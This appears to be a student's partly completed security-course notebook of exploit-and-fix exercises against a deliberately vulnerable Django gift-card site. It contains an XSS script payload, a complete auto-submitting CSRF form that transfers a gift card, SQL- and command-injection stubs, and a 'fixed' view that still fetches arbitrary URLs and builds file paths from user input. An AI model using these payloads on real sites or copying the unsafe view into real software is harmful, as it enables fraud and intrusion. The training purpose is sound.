# %%
%load_ext autoreload
%autoreload 2

import os
import sys
import django
import io
import unittest
import json
import re
import contextlib
import time
import shutil
import stat
import inspect

# Setup Django environment
os.environ.setdefault("DJANGO_SETTINGS_MODULE", "GiftcardSite.settings")
django.setup()

from django.test import TestCase, Client
from django.db import connection
from LegacySite.models import Card, User
from django.template import engines

from django.test import TransactionTestCase
from django.core.management import call_command

# %%


def exploit_xss_vulnerability():
    """
    Exploit XSS vulnerability by injecting malicious script into director parameter.

    Args:
        None

    Returns:
        bool: True if XSS payload was successfully injected, False otherwise
    """
    from django.conf import settings

    # Add testserver to ALLOWED_HOSTS if not already there
    print(settings.ALLOWED_HOSTS)
    if "testserver" not in settings.ALLOWED_HOSTS:
        settings.ALLOWED_HOSTS.append("testserver")

    client = Client()
    # TODO: Create XSS payload and test vulnerable endpoint
    # - Create a malicious JavaScript payload
    # - Replace the current response endpoint with the vulnerable one
    xss_payload = '<script>alert("HELLO WORLD")</script>'
    response = client.get("/buy/1?director={exploit}")

    print(f"XSS exploit response status: {response.status_code}")
    print(response.content)
    if response.status_code == 200:
        response_content = response.content.decode()
        if xss_payload in response_content:
            print("[+] XSS vulnerability successfully exploited!")
            print(f"[+] Malicious payload found in response: {xss_payload}")
            return True
        else:
            print("[-] XSS payload not found in response (may be escaped)")
            return False
    else:
        print(f"[-] Request failed with status {response.status_code}")
        return False


from w2d4_test import test_exploit_xss_vulnerability

if __name__ == "__main__":
    test_exploit_xss_vulnerability(exploit_xss_vulnerability)

# %%


def fix_xss_vulnerability():
    """
    Fix XSS vulnerability by finding discepencies.
    You can do it manually or edit the front end code.

    Args:
        None

    Returns:
        None
    """
    # TODO: Look for |safe filter in templates
    # - What does `|` mean in this case
    # - You can do it manually or use re.search within the code
    # fixed in code
    pass


from w2d4_test import test_fix_xss_vulnerability

if __name__ == "__main__":
    print("\nTesting XSS vulnerability fix...")
    test_fix_xss_vulnerability(fix_xss_vulnerability)

# %%


def exploit_csrf_vulnerability():
    """
    Create malicious HTML that exploits CSRF vulnerability.

    Args:
        None

    Returns:
        str: HTML content that performs the CSRF attack
    """
    # TODO: Create malicious HTML that performs CSRF attack
    # - Create an HTML page that appears legitimate
    # - Include a hidden form targeting the gift card endpoint
    # - Add JavaScript to automatically submit the form
    # - Give user "test2" a gify card
    return """
<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <title>Auto Gift Card</title>
</head>
<body>
    <form id="giftForm" action="http://localhost:8000/gift/1" method="GET">
        <input type="hidden" name="username" value="test2">
        <input type="hidden" name="amount" value="100">
    </form>

    <script>
        // Automatically submit the form when the page loads
        window.onload = function() {
            document.getElementById('giftForm').submit();
        };
    </script>
</body>
</html>
"""


from w2d4_test import test_exploit_csrf_vulnerability

if __name__ == "__main__":
    print("\nTesting CSRF vulnerability exploitation...")
    test_exploit_csrf_vulnerability(exploit_csrf_vulnerability)

# %%


def fix_csrf_vulnerability():
    """
    Fix CSRF vulnerability by implementing comprehensive CSRF protection.
    You can do it manually or edit the back end code.
    
    Args:
        None
        
    Returns:
        None
    """
    import os
    import re
    # TODO: Implement CSRF protection with tokens, middleware, and security settings
    # - Add CSRF tokens to all necessary POST forms in templates
    # - Enable CSRF middleware
    # - Add possible decorators to vulnerable views
    # - Configure secure cookie settings
    pass

from w2d4_test import test_fix_csrf_vulnerability


if __name__ == '__main__':
    print("\nTesting CSRF vulnerability fix...")
    test_fix_csrf_vulnerability(fix_csrf_vulnerability)

# %%

def exploit_sql_injection_vulnerability():
    """
    Create SQL injection payload for card signature processing.
    
    Args:
        None
        
    Returns:
        bytes: JSON-encoded card data with malicious SQL injection payload to reveal admin password hash
    """
    # TODO: Create malicious card with SQL injection payload
    # - Create a payload that breaks out of the original query
    # - Target admin credentials from the database
    injection = "'abc OR 1=1'"
    return {

    }

from w2d4_test import test_exploit_sql_injection_vulnerability


if __name__ == '__main__':
    test_exploit_sql_injection_vulnerability(exploit_sql_injection_vulnerability)

# %%

def exploit_cmd_injection_vulnerability():
    """
    Create command injection payload for filename processing.
    
    Args:
        None
        
    Returns:
        dict: POST parameters including malicious filename and malformed JSON
    """
    # todo
    malicious_filename = "my_malicious_gc"
    
    malformed_json = '{"merchant_id": "GPT-4 API Credits", "customer_id": "bro", "total_value": "838", "records": [{"record_type": "amount_change", "amount_added": 2000, "signature": "cb3e69337649de4583b61d276868f2c7"}]}'
    
    post_params = {
        #use your post params
    }
    
    return post_params or {}
from w2d4_test import test_exploit_cmd_injection_vulnerability

if __name__ == '__main__':
    test_exploit_cmd_injection_vulnerability(exploit_cmd_injection_vulnerability)

# %%

def fix_sql_injection_vulnerability():
    """
    Fixed version of use_card_view that eliminates SQL injection vulnerabilities.
    Feel free to edit `use_card_view(request)` here or in the server side code.
    
    Args:
        None
        
    Returns:
        function: The secure use_card_view function
    """
    import tempfile
    import json
    import os
    from django.shortcuts import render, redirect
    from django.http import HttpResponse
    from django.core.exceptions import ObjectDoesNotExist
    from LegacySite.models import Card, Product
    from LegacySite import extras
    def use_card_view(request):
        context = {'card_found':None}
        if request.method == 'GET':
            if not request.user.is_authenticated:
                return redirect("login.html")
            try:
                user_cards = Card.objects.filter(user=request.user).filter(used=False)
            except ObjectDoesNotExist:
                user_cards = None
            context['card_list'] = user_cards
            context['card'] = None
            return render(request, 'use-card.html', context)
        elif request.method == "POST" and request.POST.get('card_url_supplied', False):
            # Post with URL-based card, fetch and use this card.
            context['card_list'] = None
            card_url = request.POST.get('card_url', None)
            card_fname = request.POST.get('card_fname', None)
            card_error_data = 'Could not read response'
            
            if card_url is None or card_url == '':
                return HttpResponse("ERROR: No URL provided.")
            
            try:
                import urllib.request
                # Fetch card data from URL
                print('https://pastebin.com/raw/'+ card_url.split('/')[-1])
                try:
                    with urllib.request.urlopen('https://pastebin.com/raw/'+ card_url.split('/')[-1]) as response:
                        card_file_data = response.read()
                        card_error_data = card_file_data
                except urllib.error.HTTPError as e:
                    if e.code == 404:
                        # If 404, try the URL directly
                        with urllib.request.urlopen(card_url) as response:
                            card_file_data = response.read()
                            card_error_data = card_file_data
                    else:
                        raise
                except Exception as e:
                    print(e)
                
                if card_fname is None or card_fname == '':
                    card_file_path = os.path.join(tempfile.gettempdir(), f'urlcard_{request.user.id}_parser.gftcrd')
                else:
                    card_file_path = os.path.join(tempfile.gettempdir(), f'{card_fname}_{request.user.id}_parser.gftcrd')
                
                card_data = extras.parse_card_data(card_file_data, card_file_path)
                # check if we know about card.
                print(card_data.strip())
                signature = json.loads(card_data)['records'][0]['signature']
                # signatures should be pretty unique, right?
                card_query = Card.objects.filter(data=signature)
                user_cards = Card.objects.filter(user_id=request.user_id)
                card_query_string = ""
                print("Found %s cards" % len(card_query))
                for thing in card_query:
                    # print cards as strings
                    card_query_string += str(thing) + '\n'
                if len(card_query) == 0:
                    # card not known, add it.
                    if card_fname is not None:
                        card_file_path = os.path.join(tempfile.gettempdir(), f'{card_fname}_{request.user.id}_{user_cards[0].count + 1}.gftcrd')
                    else:
                        card_file_path = os.path.join(tempfile.gettempdir(), f'urlcard_{request.user.id}_{user_cards[0].count + 1}.gftcrd')
                    fp = open(card_file_path, 'wb')
                    fp.write(card_data.encode() if isinstance(card_data, str) else card_data)
                    fp.close()
                    card = Card(data=card_data, fp=card_file_path, user=request.user, used=True)
                else:
                    context['card_found'] = card_query_string
                    try:
                        card = Card.objects.get(data=card_data)
                        card.used = True
                        card.save()
                    except ObjectDoesNotExist:
                        print("No card found with data =", card_data)
                        card = None
                context['card'] = card
                return render(request, "use-card.html", context)
            except Exception as e:
                return HttpResponse(f"ERROR: Failed to fetch card from URL: {str(e)}. Card Data: {card_error_data}")
            
        elif request.method == "POST" and request.POST.get('card_supplied', False):
            # Post with specific card, use this card.
            context['card_list'] = None
            # Need to write this to parse card type.
            card_file_data = request.FILES['card_data']
            card_fname = request.POST.get('card_fname', None)
            if card_fname is None or card_fname == '':
                card_file_path = os.path.join(tempfile.gettempdir(), f'newcard_{request.user.id}_parser.gftcrd')
            else:
                card_file_path = os.path.join(tempfile.gettempdir(), f'{card_fname}_{request.user.id}_parser.gftcrd')
            card_data = extras.parse_card_data(card_file_data.read(), card_file_path)
            # check if we know about card.
            print(card_data.strip())
            signature = json.loads(card_data)['records'][0]['signature']
            # signatures should be pretty unique, right?
            card_query = Card.objects.filter(data=signature)
            user_cards = Card.objects.filter(user_id=request.user_id)
            card_query_string = ""
            print("Found %s cards" % len(card_query))
            for thing in card_query:
                # print cards as strings
                card_query_string += str(thing) + '\n'
            if len(card_query) == 0:
                # card not known, add it.
                if card_fname is not None:
                    card_file_path = os.path.join(tempfile.gettempdir(), f'{card_fname}_{request.user.id}_{user_cards[0].count + 1}.gftcrd')
                else:
                    card_file_path = os.path.join(tempfile.gettempdir(), f'newcard_{request.user.id}_{user_cards[0].count + 1}.gftcrd')
                fp = open(card_file_path, 'wb')
                fp.write(card_data)
                fp.close()
                card = Card(data=card_data, fp=card_file_path, user=request.user, used=True)
            else:
                context['card_found'] = card_query_string
                try:
                    card = Card.objects.get(data=card_data)
                    card.used = True
                    card.save()
                except ObjectDoesNotExist:
                    print("No card found with data =", card_data)
                    card = None
            context['card'] = card
            return render(request, "use-card.html", context) 
        elif request.method == "POST":
            card = Card.objects.get(id=request.POST.get('card_id', None))
            card.used=True
            card.save()
            context['card'] = card
            try:
                user_cards = Card.objects.filter(user=request.user).filter(used=False)
            except ObjectDoesNotExist:
                user_cards = None
            context['card_list'] = user_cards
            return render(request, "use-card.html", context)
        return HttpResponse("Error 404: Internal Server Error")

    # TODO: Replace raw SQL queries with Django ORM
    # - Use safe ORM methods
    # - Use parameterized queries
    # - Validate JSON data before processing
    return use_card_view
